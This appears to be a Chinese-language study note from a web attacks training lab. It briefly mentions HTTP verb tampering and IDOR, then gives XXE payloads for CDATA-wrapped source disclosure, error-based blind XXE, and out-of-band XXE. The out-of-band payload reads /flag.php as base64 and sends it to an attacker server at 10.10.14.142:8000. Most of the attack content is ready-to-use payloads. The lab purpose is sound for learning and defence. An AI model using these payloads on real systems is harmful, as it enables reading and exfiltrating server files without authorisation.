# Web Attacks

本模块涵盖三种常见的 Web 漏洞，即 HTTP 动词篡改、IDOR 和 XXE，每个漏洞都可能对公司的系统产生重大影响。我们将介绍如何通过各种方法识别、利用和防止它们中的每一个。

## HTTP HEAD/GET/POST/PUT/OPTIONS

## IDOR寻找

一般能够从前端js找到调用的js代码

## XXE - CDATA

对于非php的其他后端语言，我们想要尝试直接读取后端代码可以尝试使用CDATA，它会作为原始数据输出而不是被处理

xxe.dtd:

```xml
<!ENTITY p "%begin;%file;%end;">
```

这里调用参数实体，将文件包含在CDATA内输出

```xml
<!DOCTYPE xxx [
	<!ENTITY % begin "<[CDATA[">
	<!ENTITY % file SYSTEM "file:///index.php">
	<!ENTITY % end "]]>">
	<!ENTITY % xxe SYSTEM "http://IP:PORT/xxe.dtd">
	%xxe;
]>

<xxx>&p;</xxx>
```

这里需要使用参数实体，当参数实体在我们托管的dtd文件中引用时，参数实体将会被视为外部实体，这样就可以绕过限制，从而让外部实体与内部实体的CDATA连接

## 基于error的半盲XXE

上面的xxe都是因为有某个特定的参数会作为结果输出，但在没有输出的情况下，上面的方法是不可行的，我们可以尝试blind

当尝试使用未定义的tag或者实体的时候可能会引发error，如果后端未正确处理异常导致异常抛出，那么我们将能看到异常输出并尝试利用

xxe.dtd:

```xml
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % xxe "<!ENTITY content SYSTEM '%file;'>">
```

```xml
<!DOCTYPE email [ 
  <!ENTITY % dtd SYSTEM "http://10.10.14.142:8000/xxe.dtd">
  %dtd;
  %xxe;
]>
```

这里通过参数实体来引入dtd当%xxe;被执行后，%xxe;会创建一个新的一般实体，而这个一般实体又引用了%file;（这里也可以使用不存在的实体进行引发错误，**至少有一个错误**）;  %file;读取的文件中作为&content;这个一般实体的值，由于这个值会被解析，只要文件中存在一些特殊字符，一旦被xml解释器解析后将可能引发错误，这就是为什么我们这个例子也会引发错误的原因

如果读取的文件中没有什么东西会引发错误，那么我们就需要手动引发错误：调用不存在的实体

```xml
<!ENTITY % xxe "<!ENTITY content SYSTEM '%ENTITY;%file;'>">
```

## 带外全盲XXE

全盲只是没有任何输出包括error。其实从半盲我们可以看得出，我们通过dtd的参数实体来访问文件

```xml
<!ENTITY % xxe "<!ENTITY content SYSTEM '%file;'>">
```

我们可以通过http协议发起远程文件访问，同时将我们想要访问的目标文件通过http请求携带过来

xxe.dtd:

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag.php">
<!ENTITY % xxe "<!ENTITY content SYSTEM 'http://10.10.14.142:8000/?file=%file;'>">
```

跟半盲的基于错误的xxe差不多，不过这次%xxe;参数实体创建一个一般实体，当我们调用这个实体的时候将会携带我们读取的文件内容，发送http请求到我们的攻击者服务器

```xml
<!DOCTYPE email [ 
  <!ENTITY % dtd SYSTEM "http://10.10.14.142:8000/xxe.dtd">
  %dtd;
  %xxe;
]>
<email>&content;</email>
```

这次我们需要手动调用这个外部实体

![在这里插入图片描述](https://img-blog.csdnimg.cn/e76ed406fbca44c6a62739521bf74ffc.png)
